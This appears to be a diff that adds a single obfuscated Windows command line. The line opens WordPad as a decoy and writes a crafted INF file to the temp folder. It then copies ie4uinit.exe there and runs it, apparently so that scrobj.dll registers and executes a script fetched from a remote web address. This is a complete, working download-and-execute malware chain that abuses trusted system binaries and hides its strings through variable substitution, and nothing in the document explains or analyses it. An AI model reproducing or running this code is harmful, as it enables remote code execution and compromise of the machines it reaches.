@@ -1,0 +1,17 @@
+/v /c start "" "%ProgramFiles%\Windows NT\Accessories\wordpad.exe" & (for %h in ("itinerarye=ll" "uroede=e" "monocha=t" "nellaxi=et" "dishwi=s" ) do @set %~h) &&
+  (for %s in ("e") do @set "exrxc=%~s") &&
+  (for %y in ("s") do @set "molecular=%~y") &&
+  call(for %s in ("y") do @set "dextrorotat=%~s") &&
+  callcall(for %u in ("s") do @set "molecular=%~u") &&
+  call(for %k in ("o") do @set "descryi=%~k") &&
+  (for %g in ("p") do @set "apomictical=%~g") &&
+  (for %q in ("d") do @set "actini=%~q") &&
+  callcall(for %k in ("r") do @set "bomb=%~k") &&
+  callcall(for %r in (".") do @set "twofo=%~r") &&
+  call(for %f in ("[") do @set "guardia=%~f") &&
+  (for %s in ("g") do @set "sah=%~s") &&
+  callcall(for %f in ("c") do @set "jar=%~f") &&
+  call(for %h in ("p") do @set "apomictical=%~h") &&
+  callcallcallcallcallcallcallcallcallcallcall(for %a in ("[destinationdirs]" "defaultdestdir=11" "E7AA=01" "[defaultinstall.windows7]" "delfiles=E7AA" "Un\" "Register\" "OCXs=fyc_669CC" "[fyc_669CC]" "s%transit%r%incorp%b\" "%inhum%.%casementedn%l%dainti%,%buttressl%I,%tam%t%heir%p%aconi%/%antichlori%t%triactin%f%triactin%s%protest%a%casementedn%.%triactin%o%meconid%h%rachiti%a%agitatesunn%p%magnifi%s%transit%a%dainti%.%transit%o%unhewable%/%rapi%o%transit%k%magnifi%n%casementedn%r%incorp%l%dainti%" "[E7AA]" "i%vangue%u%rachiti%n%rachiti%t%steamf%i%fadea%f" "[strings]" "servicename= 'poliadverr'" "shortsvcname= 'poliadverr'" "agitatesunn=-" "steamf=." "antichlori=/" "aconi=:" "buttressl=N" "magnifi=a" "transit=c" "casementedn=d" "vangue=e" "protest=g" "tam=h" "rachiti=i" "inhum=j" "dainti=l" "unhewable=m" "fadea=n" "incorp=o" "meconid=p" "rapi=r" "triactin=s" "heir=t" "[version]" "signature=$windows nt$" ) do @echo %~a) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
